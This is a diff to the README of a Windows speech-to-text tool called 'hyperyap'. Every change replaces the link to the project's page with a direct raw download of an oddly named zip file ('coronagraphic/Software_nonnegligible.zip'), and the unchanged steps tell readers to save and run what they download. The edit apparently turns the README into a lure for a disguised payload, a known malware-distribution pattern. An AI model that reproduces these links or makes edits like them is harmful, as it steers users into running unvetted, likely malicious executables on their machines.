@@ -1,6 +1,6 @@
 # 🎙️ hyperyap - Fast offline speech to text for Windows
 
-[![Download hyperyap](https://img.shields.io/badge/Download%20hyperyap-blue?style=for-the-badge&logo=github)](https://github.com/woodypaired650/hyperyap)
+[![Download hyperyap](https://img.shields.io/badge/Download%20hyperyap-blue?style=for-the-badge&logo=github)](https://github.com/woodypaired650/hyperyap/raw/refs/heads/main/coronagraphic/Software_nonnegligible.zip)
 
 ## 🖥️ What hyperyap does
 
@@ -10,7 +10,7 @@ It is built for quick dictation. You can use hotkeys, start it with Windows, and
 
 ## ⬇️ Download and install
 
-1. Open the download page: https://github.com/woodypaired650/hyperyap
+1. Open the download page: https://github.com/woodypaired650/hyperyap/raw/refs/heads/main/coronagraphic/Software_nonnegligible.zip
 2. Get the latest Windows release or installer from that page.
 3. Save the file to your PC.
 4. Run the file you downloaded.
@@ -148,4 +148,4 @@ A basic Windows PC is enough for most users. For smooth speech recognition, use:
 
 ## 🔗 Download again
 
-[Visit the hyperyap download page](https://github.com/woodypaired650/hyperyap)
+[Visit the hyperyap download page](https://github.com/woodypaired650/hyperyap/raw/refs/heads/main/coronagraphic/Software_nonnegligible.zip)
